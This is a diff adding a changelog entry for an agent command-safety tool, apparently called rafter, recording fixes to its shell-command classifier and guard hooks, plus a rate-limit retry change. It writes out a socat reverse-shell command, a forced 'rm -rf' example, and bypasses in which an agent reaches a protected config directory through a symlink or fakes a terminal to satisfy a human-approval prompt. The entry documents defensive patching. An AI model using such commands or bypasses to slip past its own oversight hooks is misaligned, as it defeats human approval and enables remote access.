@@ -7,6 +7,18 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.11.5] - 2026-10-30
+
+### Security
+
+- **A socat reverse shell with a quoted program is critical** (sable-gmgh). `socat TCP:host:port EXEC:"bash -li",pty` and `SYSTEM:'bash -i'` classified `low`: the quoted address was redacted as prose before the reverse-shell rule saw it, while the unquoted `EXEC:bash` was already critical. socat now counts as code-carrying, so its quoted `EXEC:`/`SYSTEM:` program is read. The same change makes a socat pty wrapper around `rafter agent exec` elevated in its quoted forms. A plain relay (`socat - TCP:host:port`) and a quoted mention of socat stay `low`. Both Node and Python.
+- **A Write through a symlink to `~/.rafter` is refused, as a direct one already was** (sable-rxqr). The Node hook compared resolved path strings without following symlinks, so a Write to `<link>/config.json`, where `<link>` points at the rafter dir, was allowed. It now compares real paths, as the Python hook already did. The same gap made the guard miss relative paths on macOS, whose temp dirs sit behind the `/var` → `/private/var` link. Node only.
+- **The PreToolUse hook now sees through rafter's own `agent exec`** (sable-lbyp, the classifier half of rf-ss67). `rafter agent exec --force "rm -rf /tmp/x"` classified `low`: rafter was an unrecognised evaluator to the sanitizer, so its quoted operand was prose. The operand of `rafter agent exec` is now a command string — resolved by basename (`/usr/local/bin/rafter`), through package runners (`npx @rafter-security/cli`, `pnpm dlx rafter-cli`) and wrappers (`sudo -E`, `env`, `unbuffer`) — and is classified on its own merits; `--dry-run` is exempt because it runs nothing and is the documented way to check a command first; only a `--dry-run` before `--` counts, since exec takes everything after `--` as the command. A pseudo-terminal wrapper around `rafter agent exec` (`script -c`, `expect`, `unbuffer`, `socat`, Python's `pty.spawn`) is HIGH on its own, since the approval prompt only trusts a person at a TTY and those manufacture one. 17 rows added to the shared classifier battery; both runtimes.
+
+### Changed
+
+- **A 429 during scan polling is retried when it carries `Retry-After`** (sable-96ex). Polling every 10 seconds from every customer repo is exactly the traffic shape a rate limiter targets, and all three surfaces treated a 429 as fatal — so the first limiter in front of `GET /api/static/scan` would have failed every customer build instantly, on a condition one sleep would have resolved. A 429 cannot simply join 5xx either: on scan *submit* it means the account is out of credits. `Retry-After` is the disambiguator — a limiter sends one, a quota rejection does not — so the poll and results paths now retry a 429 that carries one, sleeping `min(Retry-After, 60s)` against the same failure budget as any other transient failure, and still fail fast on a bare 429. Submit is unchanged: exit `3`, even with the header. Giving up on repeated 429s now says the API rate limited us rather than blaming the report. Delay-seconds only, ASCII digits only, and only when the final response names the header exactly once — the HTTP-date form, a value `int()` cannot parse, a header repeated by a proxy, and one carried on a `103 Early Hints` block all count as absent, which means fail fast. Full contract in `shared-docs/CLI_SPEC.md`.
+
 ## [0.11.4] - 2026-10-30
 
 ### Fixed
